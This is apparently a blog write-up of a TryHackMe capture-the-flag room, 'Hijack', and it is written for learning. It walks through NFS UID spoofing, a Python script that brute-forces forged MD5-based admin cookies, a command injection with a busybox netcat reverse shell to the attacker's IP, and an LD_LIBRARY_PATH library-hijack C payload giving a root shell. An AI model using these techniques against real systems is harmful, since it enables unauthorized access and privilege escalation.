---
title: Hijack | TryHackMe
collection: publications
permalink: /publication/hijack
excerpt: 'This is a free room from TryHackMe'
date: 2023-10-24
venue: '10-24'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/hijack_header.png)

**LINK :** [Hijack](https://tryhackme.com/room/hijack)

# Enumeration : 

* Let's start by looking for open ports.

```console
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-25 11:11 EDT
Nmap scan report for 10.10.76.229
Host is up (0.12s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94eee523de796a8d63f048b862d9d7ab (RSA)
|   256 42e9551bd3f204b643b256a3234672c7 (ECDSA)
|_  256 2746f6544498432af059bae3b673d390 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|
2049/tcp open  nfs_acl 2-3 (RPC #100227)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

* We see few open ports : 
    - ``ftp`` on port 21
    - ``ssh`` on port 22
    - ``http`` on port 80
    - ``nfs`` on port 2049

* Upon visiting the web page, we encountered an ``administration`` page that denied us access, indicating that it's accessible only to admins. This information suggests that there might be an admin account we can target.

![hijack1](/images/hijack1.png)

* we proceeded to the login page and attempted to log in with a random username. The system's response was ``no account found with that username.`` This response exposes a vulnerability allowing us to enumerate valid usernames on the system.

![hijack2](/images/hijack2.png)

* We then tried to log in as 'admin' with a random password, receiving the response, ``the password you entered is not valid.`` This confirms the presence of an 'admin' username on the website.

![hijack3](/images/hijack3.png)

* Since we did not have any valid credentials for the web application, we decided to investigate the NFS port, a potential point of entry. 

* By listing the available shares, we discovered a globally accessible file-share at ``/mnt/share``.

```console
showmount -e 10.10.X.X
```

![hijack4](/images/hijack4.png)

* let's try to mount it 

```console
sudo mount -t nfs 10.10.79.63:/mnt/share nfs_share
```
*  when we tried to access it, we received a ``permission denied`` message.

![hijack5](/images/hijack5.png)

* To address the permission issue, we examined the ownership and permissions of the mounted directory. We discovered that it was owned by a user with the UID 1003.

![hijack6](/images/hijack6.png)

> NFS lacks authentication and authorization mechanisms. By creating a local user on our machine with the UID and GID set to 1003, we were able to imitate the owner of the NFS share and inherit their permissions over the directory.

* We created a user with the UID 1003 and GID 1003 on our local system to mimic the share's owner.

```console
sudo useradd hijack_user
sudo usermod -u 1003 hijack_user
sudo groupmod -g 1003 hijack_user
```

* now we login as that user and try to access the mounted share 

```console
su hijack_user
```

* Upon accessing the mounted share, we found a text file containing credentials for an FTP server.

![hijack7](/images/hijack7.png)

* With the obtained FTP credentials, we logged in to the FTP server.

* Let's list the content of this server :

![hijack8](/images/hijack8.png)

* we see that there are 2 hidden text files named ``.from_admin.txt`` and ``passwords_list.txt``.

 ``.from_admin.txt`` : 

 ![hijack9](/images/hijack9.png)

 ``passwords_list.txt`` : 

 ![hijack10](/images/hijack10.png)


* These files provided us with crucial information:
    - Two potential usernames: 'admin' and 'rick'.
    - Confirmation that one of the passwords from the list corresponds to the 'admin' account.
    - Knowledge that the website has a brute force protection mechanism in place.

* To verify the website's brute force protection, we attempted to log in as 'admin' with passwords from the list. After five failed login attempts, the site blocked access to the account for five minutes.

![hijack11](/images/hijack11.png)

* While technically it was possible to brute force the login page, the rate limiting restriction of 5 failed attempts before a 5-minute lockout would make this a time-consuming process.

* The presence of a signup page caught our attention. We registered a new account through the signup process and successfully logged in.

![hijack12](/images/hijack12.png)

* After logging in, we inspected the cookie that was set. The cookie's value appeared to be encoded in base64. We attempted to decode it to verify its contents.

![hijack13](/images/hijack13.png)

![hijack14](/images/hijack14.png)

* Upon decoding the cookie, we discovered that its format was 'USERNAME:HASH.' To determine the hash type, we employed the 'hash-identifier' tool, which identified it as an MD5 hash.

![hijack15](/images/hijack15.png)

* The placement of this hash within the cookie value strongly indicated that it represented the password hash. To confirm our suspicion, we hashed the password we had used to log in which was ``password1`` with MD5.

![hijack16](/images/hijack16.png)

* Our suspicion was confirmed when the hash of our password matched the hash value found in the cookie. This validated our understanding that the cookie contained the password hash.

* I used this simple python script to get the admin's cookie session

```console
import requests
import hashlib
import base64

file_path = '.passwords_list.txt'
_fail = r"Access denied"

def generate_sessionid(password):
    hashed_password = hashlib.md5(password.encode('utf-8')).hexdigest()
    plain = "admin:" + hashed_password
    encoded_bytes = base64.b64encode(plain.encode('utf-8')).decode('utf-8')
    return encoded_bytes

def check_valid_session(password):
    sessionid = generate_sessionid(password)
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://hijack.thm',
        'Referer': 'http://hijack.thm/administration.php',
        'Cookie': 'PHPSESSID=' + sessionid,
        'Upgrade-Insecure-Requests': '1'
    }
    url = 'http://hijack.thm/administration.php'

    response = requests.post(url, headers=headers)
    text = response.text
    fail = re.findall(_fail, text)
    return len(fail) == 0

def main():
    with open(file_path, 'r') as file:
        for line in file:
            password = line.strip()
            if check_valid_session(password):
                print("Valid session found for password: " + password)

if __name__ == "__main__":
    main()
```
* The script iterates through the list of passwords we had, generating a session ID for each password and sending an HTTP request to ``administration`` page with the session ID in the headers. If the response does not contain the ``Access denied`` message, it considers the session valid and prints the session id for the ``admin``.

![hijack17](/images/hijack17.png)

![hijack18](/images/hijack18.png)

![hijack19](/images/hijack19.png)

## Initial foothold : 

* After getting the session cookie for the ``admin`` user, we were able to access the admin panel which looks like we can check the status of the services on this server.

![hijack20](/images/hijack20.png)

* the checker feature might be vulnerable to command injection. This presented an opportunity to execute commands on the system, let's try to inject the ``id`` command.

![hijack21](/images/hijack21.png)

* It seems like there is a filtering function, let's try to bypass it using the ``&`` symbol.

![hijack22](/images/hijack22.png)

* We successfully injected the command, our next step is trying to get a reverse shell.

* We attempted several payloads from [revshells.com](revshell) to exploit the command injection vulnerability. Among them, one payload worked as it contained none of the filtered characters.

```console
$(busybox nc <you-ip> 4444 -e /bin/bash)
```

![hijack23](/images/hijack23.png)

![hijack24](/images/hijack24.png)

## User Flag : 

* Further investigation led us to the 'config.php' file within the web application, where we found the credentials for the MySQL database. The user 'rick' was mentioned both in the configuration file and in an admin note. Additionally, 'rick' was a user of the system, as indicated in '/etc/passwd.

![hijack25](/images/hijack25.png)

* Let's try to connect as ``rick`` via ``ssh`` with the credentials we found maybe those credentials were reused.

![hijack26](/images/hijack26.png)

* It worked and we got our first flag.

## Root Flag : 

* Upon examining the privileges of the ``rick`` user, we discovered that the ``Apache2`` service could be executed via 'sudo' by providing ``rick's`` password. We also noticed the ``LD_LIBRARY_PATH`` variable, which contained a list of directories for shared libraries.

![hijack27](/images/hijack27.png)

* To escalate our privileges, we devised a plan to load a custom library that would execute code to provide us with a privileged shell.

*  Let's list the shared libraries used by ``Apache2`` and  hijack one of them by creating a file with the same name.

![hijack28](/images/hijack28.png)

* We created a short C program to replace one of the listed libraries and compiled it with the exact name, ``libcrypt.so.1``

```console
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
![hijack29](/images/hijack29.png)

* With the custom ``libcrypt.so.1`` library at our disposal, we executed the ``Apache2`` command while setting the ``LD_LIBRARY_PATH`` variable to the location of our library which is ``/tmp``

![hijack30](/images/hijack30.png)

* We successfully escalated our privileges to become the root user and got the root flag.